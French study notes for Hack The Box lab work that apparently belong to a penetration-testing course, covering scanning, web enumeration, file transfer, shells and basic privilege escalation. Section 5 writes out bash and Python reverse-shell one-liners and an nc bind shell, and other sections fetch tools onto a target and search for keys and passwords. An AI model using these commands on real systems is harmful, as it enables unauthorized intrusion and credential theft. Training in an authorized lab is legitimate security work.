# 02 — Getting Started

## Objectifs
Premiers pas : connexion au lab, prise en main de la méthodologie, scan de services, énumération web, transfert de fichiers, shells, privilege escalation de base.

---

## 1. Connexion au lab

```bash
# VPN HTB
sudo openvpn --config labs_SKIPLALESSIVE.ovpn
ip a | grep tun          # vérifier l'interface tun0
ping -c 1 <TARGET>

# Vérifier la connectivité et le hostname
nmap -sn <TARGET>/24
```

### Troubleshooting VPN
```bash
sudo systemctl status openvpn
ip route | grep tun
# Conflit de sous-réseau : changer le subnet du lab ou ajouter une route
sudo ip route add 10.10.10.0/24 dev tun0
```

---

## 2. Scan & énumération de base

```bash
# Scan TCP complet
nmap -p- --min-rate 5000 -T4 -oN nmap_all.txt <TARGET>

# Scan de services sur les ports ouverts
nmap -sCV -p22,80,445 -oN nmap_svc.txt <TARGET>

# Scan UDP top ports
sudo nmap -sU --top-ports 20 <TARGET>

# Scripts par catégorie
nmap --script "default,safe" -p- <TARGET>
```

### Analyse des résultats
- Port 22 → SSH (versions, auth par clé/mot de passe)
- 80/443 → serveur web : `whatweb`, `curl -I`, robots.txt
- 139/445 → SMB : `smbclient -L`, `enum4linux-ng`
- 3306 → MySQL, 1433 → MSSQL, 21 → FTP anonyme

---

## 3. Énumération web

```bash
# Technologies
whatweb -a 3 http://<TARGET>
curl -sI http://<TARGET>

# Contenu
gobuster dir -u http://<TARGET> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
feroxbuster -u http://<TARGET> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

# Fichiers standards
curl http://<TARGET>/robots.txt
curl http://<TARGET>/sitemap.xml
curl http://<TARGET>/.git/HEAD

# Virtual hosts
ffuf -u http://<TARGET> -H "Host: FUZZ.<DOMAIN>" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0
```

---

## 4. Transfert de fichiers (aperçu — détail module 07)

```bash
# Serveur HTTP côté attaquant
python3 -m http.server 8000

# Côté cible Linux
wget http://<LHOST>:8000/linpeas.sh -O /tmp/linpeas.sh
curl http://<LHOST>:8000/linpeas.sh -o /tmp/linpeas.sh

# Côté cible Windows
certutil -urlcache -split -f http://<LHOST>:8000/winPEAS.exe C:\Temp\winPEAS.exe
powershell -c "IWR http://<LHOST>:8000/nc.exe -OutFile C:\Temp\nc.exe"
```

---

## 5. Shells de base

```bash
# Listener
nc -lvnp 4444

# Reverse shell bash
bash -i >& /dev/tcp/<LHOST>/4444 0>&1

# Reverse shell Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<LHOST>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Bind shell
nc -lvnp 4444 -e /bin/bash
```

### Stabilisation TTY
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
stty rows 40 cols 180
```

---

## 6. Privilege escalation de base

```bash
# Linux
id; sudo -l
find / -perm -u=s -type f 2>/dev/null
getcap -r / 2>/dev/null
uname -a; cat /etc/crontab
ps aux --forest
./linpeas.sh

# Windows
whoami /priv
whoami /groups
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
.\winPEASx64.exe
```

---

## 7. Méthodologie « Getting Started »

1. **Scan** → ports/services
2. **Enum** → versions, chemins, utilisateurs, partages
3. **Exploit** → CVE, credentials faibles, misconfig
4. **Foothold** → shell, accès web admin
5. **Enum locale** → privesc
6. **Privesc** → root/SYSTEM
7. **Flag + documentation**

### Questions à se poser à chaque étape
- Quelle version exacte ? Vulnérable ?
- Y a-t-il des identifiants par défaut ?
- Un fichier de configuration expose-t-il des secrets ?
- Le service tourne-t-il en tant que quel utilisateur ?
- Puis-je réutiliser des credentials ailleurs ?

---

## Commandes utiles transverses

```bash
# Trouver des fichiers intéressants
find / -name "*.conf" -o -name "*.bak" -o -name "id_rsa" 2>/dev/null
grep -ri "password" /var/www 2>/dev/null

# Historique & secrets
cat ~/.bash_history
env
cat /etc/passwd | grep -v nologin

# Réseau interne
ip a; ip route; arp -a; cat /etc/hosts
netstat -tulpn
```

## Checklist
- [ ] VPN OK, cible joignable
- [ ] Scan complet + services identifiés
- [ ] Enumération web et services
- [ ] Point d'entrée exploité documenté
- [ ] Shell stable obtenu
- [ ] Privesc tentée (linpeas/winpeas + manuel)
- [ ] Preuves collectées
